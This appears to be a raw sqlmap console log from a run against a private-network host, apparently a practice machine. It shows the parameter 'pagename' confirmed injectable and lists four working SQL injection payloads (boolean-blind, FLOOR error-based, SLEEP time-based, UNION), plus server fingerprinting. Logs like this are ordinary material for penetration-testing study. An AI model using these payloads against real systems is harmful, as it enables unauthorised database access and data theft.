        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.7#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 13:09:13

[13:09:13] [INFO] testing connection to the target URL
[13:09:13] [INFO] testing if the target URL content is stable
[13:09:14] [INFO] target URL content is stable
[13:09:14] [INFO] testing if GET parameter 'pagename' is dynamic
[13:09:14] [INFO] confirming that GET parameter 'pagename' is dynamic
[13:09:14] [INFO] GET parameter 'pagename' is dynamic
[13:09:14] [WARNING] heuristic (basic) test shows that GET parameter 'pagename' might not be injectable
[13:09:14] [INFO] testing for SQL injection on GET parameter 'pagename'
[13:09:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:09:14] [INFO] GET parameter 'pagename' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="the")
[13:09:14] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n] [13:09:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:09:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:09:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:09:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:09:28] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:09:28] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:09:28] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:09:28] [INFO] GET parameter 'pagename' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[13:09:28] [INFO] testing 'MySQL inline queries'
[13:09:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[13:09:28] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[13:09:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[13:09:28] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[13:09:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[13:09:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[13:09:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[13:09:37] [INFO] GET parameter 'pagename' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[13:09:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:09:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:09:37] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[13:09:37] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[13:09:37] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[13:09:37] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[13:09:37] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[13:09:38] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[13:09:38] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[13:09:38] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[13:09:38] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[13:09:38] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:09:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:09:38] [INFO] target URL appears to have 1 column in query
[13:09:38] [INFO] target URL appears to be UNION injectable with 1 columns
[13:09:38] [INFO] GET parameter 'pagename' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'pagename' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 278 HTTP(s) requests:
---
Parameter: pagename (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: pagename=home' AND 3187=3187 AND 'usHz'='usHz

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: pagename=home' AND (SELECT 2096 FROM(SELECT COUNT(*),CONCAT(0x716b627671,(SELECT (ELT(2096=2096,1))),0x716a7a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'BYlt'='BYlt

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: pagename=home' AND SLEEP(5) AND 'DRpx'='DRpx

    Type: UNION query
    Title: MySQL UNION query (NULL) - 1 column
    Payload: pagename=-4835' UNION ALL SELECT CONCAT(0x716b627671,0x466945467645735966464d5a7371784765426b56567a5a71656e6d4b416a7a5554766f7875705670,0x716a7a7071)#
---
[13:10:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
[13:10:07] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.92.178'

[*] shutting down at 13:10:07

